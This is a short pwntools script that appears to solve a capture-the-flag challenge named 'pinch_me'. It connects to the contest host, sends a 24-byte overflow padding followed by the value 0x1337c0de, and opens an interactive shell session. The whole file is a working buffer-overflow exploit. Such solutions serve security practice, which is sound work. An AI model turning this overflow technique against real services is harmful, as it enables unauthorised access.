from pwn import *

#r = process('./pinch_me')
r = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

p = 'a'*24 + p64(0x1337c0de)
r.sendafter('g?',p)

r.interactive()
